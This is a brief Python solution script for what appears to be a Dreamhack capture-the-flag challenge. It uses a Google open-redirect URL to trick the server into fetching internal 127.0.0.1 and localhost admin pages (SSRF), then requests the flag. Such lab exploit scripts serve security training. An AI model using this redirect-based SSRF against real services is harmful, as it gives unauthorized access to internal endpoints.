import requests

# 기본 URL 설정
base_url = "http://host3.dreamhack.games:16001"

# 다양한 리다이렉트 URL 시도
redirect_urls = [
    "http://www.google.com/url?q=http://127.0.0.1/admin?nickname=exploit",
    "http://www.google.com/url?q=http://127.0.0.1:80/admin?nickname=exploit",
    "http://www.google.com/url?q=http://localhost/admin?nickname=exploit"
]

for redirect_url in redirect_urls:
    print(f"Testing URL: {redirect_url}")

    # SSRF 요청을 보냅니다.
    data = {
        "url": redirect_url
    }

    # HTTP POST 요청을 사용하여 /check-url 엔드포인트로 데이터를 전송합니다.
    response = requests.post(f"{base_url}/check-url", json=data)

    # 서버 응답 확인
    print("SSRF Check Response:", response.text)

    # FLAG 요청
    flag_request_url = f"{base_url}/flag?nickname=exploit"
    flag_response = requests.post(flag_request_url)

    # FLAG 결과 출력
    print("FLAG Response:", flag_response.text)
    print("\n")
